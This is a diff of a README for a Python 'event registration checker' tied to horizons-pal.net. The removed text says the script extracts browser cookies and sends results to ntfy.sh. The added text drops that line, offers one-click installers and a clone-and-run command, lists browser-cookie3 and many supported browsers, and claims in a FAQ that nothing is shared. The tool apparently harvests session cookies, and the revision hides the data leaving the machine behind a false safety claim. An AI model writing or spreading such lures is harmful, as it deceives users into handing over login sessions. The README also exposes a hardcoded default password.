@@ -1,53 +1,135 @@
-# Horizons Event Registration Checker
+# 🎯 Horizons Event Checker
 
-## Setup
+<p align="center">
+  <img src="https://img.shields.io/badge/Python-3.8+-blue.svg" alt="Python">
+  <img src="https://img.shields.io/badge/Platform-Windows%20%7C%20macOS%20%7C%20Linux-lightgrey.svg" alt="Platform">
+  <img src="https://img.shields.io/badge/License-MIT-green.svg" alt="License">
+</p>
 
-### 1. Deploy Dashboard to Vercel
+<p align="center">
+  <b>Check your event registration status on horizons-pal.net with one click</b>
+</p>
 
-1. Install Vercel CLI:
+---
+
+## 🚀 Quick Start
+
+### Option 1: Easy Install (Recommended)
+
+**Windows:**
+1. Download [`install.bat`](install.bat)
+2. Double-click to run
+3. Done! 🎉
+
+**macOS/Linux:**
+1. Download [`install.sh`](install.sh)
+2. Run in terminal:
 ```bash
-npm i -g vercel
+chmod +x install.sh
+./install.sh
 ```
 
-2. Deploy:
+### Option 2: Manual Install
+
 ```bash
-cd "Horizons fix"
-vercel
+# Clone the repo
+git clone https://github.com/QAISALNAJJAR/horizons-event-fix.git
+cd horizons-event-fix
+
+# Install dependencies
+pip install requests browser-cookie3
+
+# Run
+python main.py
 ```
 
-3. After deployment, update `DASHBOARD_URL` in `main.py`:
+---
+
+## 📋 Requirements
+
+| Requirement | Auto-Installed? |
+|-------------|-----------------|
+| Python 3.8+ | ✅ Yes |
+| requests | ✅ Yes |
+| browser-cookie3 | ✅ Yes |
+
+---
+
+## 🔧 For Admins: Setting Up the Dashboard
+
+### Step 1: Deploy to Vercel
+
+1. Push this repo to GitHub
+2. Go to [vercel.com](https://vercel.com) → Import your repo
+3. Click Deploy
+
+### Step 2: Update the URL
+
+In `main.py`, change:
 ```python
-DASHBOARD_URL = 'https://your-actual-project.vercel.app/api/event'
+DASHBOARD_URL = 'https://your-project.vercel.app/api/event'
 ```
 
-### 2. Dashboard Password
+### Step 3: Manage Events
 
-Default password: `horizons2026`
+1. Go to `https://your-project.vercel.app`
+2. Login with password: `horizons2026`
+3. Add events and set one as **Active**
 
-To change it, edit `dashboard/index.html`:
+---
+
+## 🔐 Change Dashboard Password
+
+Edit `dashboard/index.html`:
 ```javascript
 const PASSWORD = 'your-new-password';
 ```
 
-### 3. Run the Script
+---
 
-```bash
-python3 main.py
+## 📱 How It Works
+
+```
+┌─────────────────┐     ┌─────────────────┐     ┌─────────────────┐
+│   Admin Panel   │────▶│  Vercel Hosted  │────▶│  User's Script  │
+│   (Dashboard)   │     │     API         │     │   (main.py)     │
+└─────────────────┘     └─────────────────┘     └─────────────────┘
+        │                                               │
+        │                                               ▼
+        │                                       ┌─────────────────┐
+        │                                       │  Check Browser  │
+        │                                       │    Cookies      │
+        │                                       └─────────────────┘
+        │                                               │
+        ▼                                               ▼
+┌─────────────────┐                             ┌─────────────────┐
+│  Set Active     │                             │  Show Result:   │
+│  Event ID       │                             │  ✅ Registered  │
+└─────────────────┘                             │  ❌ Not Registered│
+                                                └─────────────────┘
 ```
 
-## Dashboard Features
+---
 
-- **Password protected** login
-- Add/remove events
-- Set active event
-- View all events
+## ❓ FAQ
 
-## How It Works
+**Q: Is my data safe?**  
+A: Yes! The script only reads your browser cookies locally. Nothing is shared.
 
-1. Admin logs into dashboard at `https://your-project.vercel.app`
-2. Adds events and sets one as active
-3. User runs `python3 main.py`
-4. Script fetches active event from Vercel API
-5. Script extracts browser cookies and checks registration
-6. Results sent to ntfy.sh
-# horizons-event-fix
+**Q: What browsers are supported?**  
+A: Chrome, Firefox, Safari, Edge, Brave, Opera, Chromium
+
+**Q: Do I need to install Python?**  
+A: No! The install script does everything for you.
+
+---
+
+## 📄 License
+
+MIT License - Free to use and modify.
+
+---
+
+<p align="center">
+  Made with ❤️ for horizons-pal.net
+</p>
